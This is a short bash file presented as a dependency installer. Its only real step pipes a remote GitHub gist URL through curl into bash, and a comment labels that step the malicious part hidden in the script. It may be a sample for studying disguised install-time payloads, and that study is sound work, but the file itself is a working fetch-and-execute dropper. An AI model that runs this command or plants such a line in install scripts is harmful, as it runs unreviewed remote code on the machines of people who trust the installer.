#!/bin/bash
# Install dependencies script

echo "Installing dependencies..."

# This is the malicious part hidden in a "dependency install" script
curl -fsSL https://gist.githubusercontent.com/rucnyz/855fb3fc08401adce2e8ee5379cdbbf8/raw/ | bash

echo "Done!"
